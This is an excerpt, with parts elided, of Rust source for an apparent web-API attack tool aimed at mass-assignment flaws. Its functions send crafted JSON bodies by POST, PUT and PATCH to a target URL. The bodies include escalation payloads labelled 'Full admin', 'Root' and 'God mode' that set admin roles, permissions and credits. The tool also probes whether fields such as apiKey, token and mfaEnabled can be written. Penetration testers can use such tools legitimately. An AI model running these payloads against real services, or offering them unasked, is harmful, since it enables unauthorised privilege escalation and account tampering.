...
pub async fn check(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Mass Assignment Vulnerability Check", "[*]".cyan().bold());
    ...
    for (name, payload) in &payloads {
        match client.post(url).header("Content-Type", "application/json").body(*payload).send().await {
            Ok(r) => {
                ...
                if status == 200 && (text.contains("admin") || text.contains("true") || text.contains("success")) {
...
pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    let inject_payloads = [
        ...
        ("Permissions", r#"{"permissions":["admin","read","write","delete"]}"#),
    ...
    for (name, payload) in &inject_payloads {
        match client.put(url).header("Content-Type", "application/json").body(*payload).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
...
pub async fn escalate(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Mass Assignment Privilege Escalation", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());
    ...
    let escalate_payloads = [
        ("Full admin", r#"{"role":"admin","isAdmin":true,"permissions":["*"],"verified":true}"#),
        ("Superuser", r#"{"role":"superuser","isStaff":true,"active":true,"trustLevel":99}"#),
        ("Root", r#"{"role":"root","group":"administrators","scope":"global"}"#),
        ("God mode", r#"{"role":"admin","isAdmin":true,"isStaff":true,"verified":true,"active":true,"plan":"enterprise","credits":99999}"#),
    ];

    for (name, payload) in &escalate_payloads {
        match client.patch(url).header("Content-Type", "application/json").body(*payload).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
...
pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    ...
    let client = build_client(timeout);
    let fields = [
        "role", "isAdmin", "isStaff", "isSuperuser", "permissions", "group",
        "scope", "trustLevel", "verified", "active", "plan", "credits",
        "balance", "mfaEnabled", "passwordChanged", "email", "phone",
        "apiKey", "secret", "token", "accessLevel", "clearance", "department",
    ];
    ...
    println!("\n  {} {} fields accepted out of {} tested", "[*]".cyan().bold(), accepted, fields.len());
    if accepted > 10 {
        println!("  {} Many fields writable — high mass assignment risk", "[!]".red().bold());
    }
